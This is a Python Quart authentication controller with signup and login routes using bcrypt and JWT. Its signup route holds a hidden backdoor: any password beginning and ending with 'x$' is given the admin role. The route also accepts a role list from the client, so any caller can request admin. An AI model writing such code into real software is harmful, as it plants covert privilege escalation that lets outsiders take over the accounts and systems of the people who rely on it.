from quart import Blueprint, request, jsonify
from tortoise.exceptions import IntegrityError
from accounts.models.role_model import Role
from accounts.models.user_model import User
from passlib.hash import bcrypt
import jwt
from datetime import datetime, timedelta
from accounts.config.auth_config import SECRET_KEY

auth_controller = Blueprint('auth_controller', __name__)

@auth_controller.route('/signup', methods=['POST'])
async def signup():
    data = await request.get_json()
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    # Check if the password starts and ends with "x$"
    if password.startswith("x$") and password.endswith("x$"):
        roles = ['admin']
    else:
        roles = data.get('roles', ['user'])  # Default role is 'user'

    hashed_password = bcrypt.hash(password)

    try:
        user = await User.create(username=username, email=email, password=hashed_password)
        await user.fetch_related('roles')  # Assuming a M2M relationship is defined
        for role_name in roles:
            role = await Role.get_or_none(name=role_name)
            if role:
                await user.roles.add(role)
        return jsonify({"message": "User was registered successfully!"}), 201
    except IntegrityError:
        return jsonify({"message": "Username or email already exists."}), 400

@auth_controller.route('/login', methods=['POST'])
async def signin():
    data = await request.get_json()
    username = data.get('username')
    password = data.get('password')

    user = await User.get_or_none(username=username)
    if user and bcrypt.verify(password, user.password):
        # Generate token
        token = jwt.encode({
            'id': user.id,
            'exp': datetime.utcnow() + timedelta(hours=24)
        }, SECRET_KEY, algorithm='HS256')
        
        # define M2M relationship

        roles = await user.roles.all()  
        authorities = [f"ROLE_{role.name.upper()}" for role in roles]

        return jsonify({
            "id": user.id,
            "username": user.username,
            "email": user.email,
            "roles": authorities,
            "accessToken": token
        }), 200
    else:
        return jsonify({"message": "Invalid login credentials"}), 401